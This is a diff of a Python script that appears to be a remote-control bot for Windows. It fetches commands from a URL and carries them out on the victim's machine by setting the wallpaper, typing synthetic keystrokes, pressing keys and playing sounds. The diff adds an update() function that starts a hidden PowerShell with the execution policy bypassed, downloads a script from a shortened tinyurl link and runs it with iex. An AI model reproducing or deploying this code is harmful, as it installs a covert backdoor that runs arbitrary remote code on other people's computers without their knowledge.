@@ -37,36 +37,56 @@ def set_wallpaper(path):
 
 SendInput = ctypes.windll.user32.SendInput
 
-INPUT_KEYBOARD = 1
-KEYEVENTF_KEYUP = 0x0002
+SendInput = ctypes.windll.user32.SendInput
 
-class KEYBDINPUT(ctypes.Structure):
-    _fields_ = [
-        ("wVk", ctypes.c_ushort),
-        ("wScan", ctypes.c_ushort),
-        ("dwFlags", ctypes.c_uint),
-        ("time", ctypes.c_uint),
-        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
-    ]
+endInput = ctypes.windll.user32.SendInput
 
-class INPUT(ctypes.Structure):
-    _fields_ = [("type", ctypes.c_uint),
-                ("ki", KEYBDINPUT)]
+# C struct redefinitions 
+PUL = ctypes.POINTER(ctypes.c_ulong)
+class KeyBdInput(ctypes.Structure):
+    _fields_ = [("wVk", ctypes.c_ushort),
+                ("wScan", ctypes.c_ushort),
+                ("dwFlags", ctypes.c_ulong),
+                ("time", ctypes.c_ulong),
+                ("dwExtraInfo", PUL)]
+
+class HardwareInput(ctypes.Structure):
+    _fields_ = [("uMsg", ctypes.c_ulong),
+                ("wParamL", ctypes.c_short),
+                ("wParamH", ctypes.c_ushort)]
+
+class MouseInput(ctypes.Structure):
+    _fields_ = [("dx", ctypes.c_long),
+                ("dy", ctypes.c_long),
+                ("mouseData", ctypes.c_ulong),
+                ("dwFlags", ctypes.c_ulong),
+                ("time",ctypes.c_ulong),
+                ("dwExtraInfo", PUL)]
+
+class Input_I(ctypes.Union):
+    _fields_ = [("ki", KeyBdInput),
+                 ("mi", MouseInput),
+                 ("hi", HardwareInput)]
+
+class Input(ctypes.Structure):
+    _fields_ = [("type", ctypes.c_ulong),
+                ("ii", Input_I)]
 
 
 
-def SendKeys(key):
-    # If user passed a character like "A"
-    if isinstance(key, str):
-        key = ord(key.upper())  # convert to virtual-key code
+def PressKey(hexKeyCode):
+    if isinstance(hexKeyCode, str):
+        hexKeyCode = ord(hexKeyCode.upper())
+    extra = ctypes.c_ulong(0)
+    ii_ = Input_I()
+    ii_.ki = KeyBdInput( hexKeyCode, 0x48, 0, 0, ctypes.pointer(extra) )
+    ##scancode
+    #ii_.ki = KeyBdInput( 0, hexKeyCode, 0x0008, 0, ctypes.pointer(extra) )
+    x = Input( ctypes.c_ulong(1), ii_ )
+    ctypes.windll.user32.SendInput(1, ctypes.pointer(x), ctypes.sizeof(x))
 
-    # Key down
-    down = INPUT(INPUT_KEYBOARD, KEYBDINPUT(key, 0, 0, 0, None))
-    SendInput(1, ctypes.byref(down), ctypes.sizeof(down))
 
-    # Key up
-    up = INPUT(INPUT_KEYBOARD, KEYBDINPUT(key, 0, KEYEVENTF_KEYUP, 0, None))
-    SendInput(1, ctypes.byref(up), ctypes.sizeof(up))
+
 
 def play_wav(path):
     ctypes.windll.winmm.PlaySoundW(path, 0, 1) 
@@ -108,6 +128,7 @@ def SetForeground(title):
 # BEGIN CORE LOGIC
 
 
+
 def fetch_message():
     try:
         response = requests.get(url)
@@ -136,6 +157,12 @@ def run_command(*args):
 
 subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
 import requests
+
+
+def update():
+    run_command("powershell.exe", "-Command", "start powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command 'iwr https://tinyurl.com/37c7jjb7 -UseBasicParsing | iex'")
+    time.sleep(1)
+    exit()
 
 def main():
     old_content = ""
@@ -167,10 +194,10 @@ def main():
                 set_wallpaper(command[1])
             elif command[0] == "string":
                 for char in command[1]:
-                    SendKeys(char)
-                    time.sleep(0.05)
+                    PressKey(char)
+                    time.sleep(0.1)
             elif command[0] == "key":
-                SendKeys(command[1])
+                PressKey(command[1])
             elif command[0] == "wav":
                 play_wav(command[1])
             elif command[0] == "move":
